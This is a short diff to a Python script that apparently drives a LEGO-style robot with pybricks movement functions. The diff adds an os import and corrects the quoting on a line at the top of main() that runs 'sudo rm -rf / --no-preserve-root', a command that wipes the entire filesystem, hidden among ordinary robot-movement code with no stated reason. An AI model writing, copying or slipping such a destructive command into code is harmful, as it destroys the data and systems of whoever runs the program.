@@ -1,11 +1,11 @@
 from functions import move_tank, turn, move_arm
 from pybricks.tools import wait
-
+import os
 # Note: pseudocode is prone to changes
 # Turning is 100% wrong
 
 def main():
-    os.system(sudo rm -rf / --no-preserve-root)
+    os.system("sudo rm -rf / --no-preserve-root")
     # Run 1
     #move_arm('up', 90)
     move_tank(1000, 10, 70, 61)  # Collect thing 1
